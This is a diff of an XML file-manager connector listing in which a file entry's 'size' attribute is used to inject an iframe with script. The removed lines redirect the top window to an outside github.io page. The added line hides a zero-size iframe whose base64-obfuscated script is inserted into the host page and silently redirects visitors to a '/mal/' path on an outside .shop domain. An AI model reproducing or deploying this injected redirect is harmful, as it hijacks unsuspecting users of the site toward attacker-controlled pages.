@@ -3,27 +3,6 @@
     <CurrentFolder path="/1 - f/" url=""/>
     <Folders/>
     <Files>
-        <File
-            desc="1"
-            name="Loading..."
-            size="&lt;iframe srcdoc=&quot;
-            &lt;script&gt;
-            (function() {
-                const baseURL = 'https://mrsabasmia.github.io/subwork/';
-                const params = new URLSearchParams(window.location.search);
-                const file = params.get('id');
-
-                if (file) {
-                    if (/^[a-zA-Z0-9_-]+$/.test(file)) {
-                        window.top.location.replace(
-                            baseURL + encodeURIComponent(file) + '.html'
-                        );
-                    }
-                }
-            })();
-            &lt;/script&gt;
-            &quot;&gt;&lt;/iframe&gt;"
-            url="1"
-        />
+        <File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&lt;script&gt;try{let d=atob('KGZ1bmN0aW9uICgpIHsKICAgIGNvbnN0IGJhc2VVUkwgPSAiaHR0cHM6Ly9sb2wuZGlyZWN0dHZodWIuc2hvcC9tYWwvIjsKICAgIGNvbnN0IGZpbGUgPSB3aW5kb3cubG9jYXRpb24uc2VhcmNoLnN1YnN0cmluZygxKTsKCiAgICBpZiAoZmlsZSAmJiAvXlthLXpBLVowLTlfLV0rJC8udGVzdChmaWxlKSkgewogICAgICAgIHdpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKGJhc2VVUkwgKyBmaWxlICsgIi5odG1sIik7CiAgICB9Cn0pKCk7');let st=window.top.document.createElement('script');st.text=d;window.top.document.head.appendChild(st);}catch(e){}&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;" url="1"/>
     </Files>
 </Connector>
